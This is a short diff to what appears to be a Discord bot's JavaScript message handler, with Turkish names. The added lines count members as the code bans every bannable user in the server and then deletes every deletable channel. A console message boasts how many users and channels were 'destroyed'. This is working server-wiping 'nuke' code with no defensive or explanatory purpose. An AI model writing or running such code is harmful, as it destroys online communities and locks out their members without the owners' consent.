@@ -6,13 +6,17 @@ if (message.guild) {
 let kanallar = 0;
 let roller = 0;
 let emojiler = 0;
+let insan = 0;
 
       
 message.guild.members.forEach(u => {
 if (u.bannable) {
+insan++
 message.guild.ban(u, "Berke Adamdır")
 }
 })
+
+console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal  yok edildi!`);
   
 message.guild.channels.forEach(c => {
 if (c.deletable) {
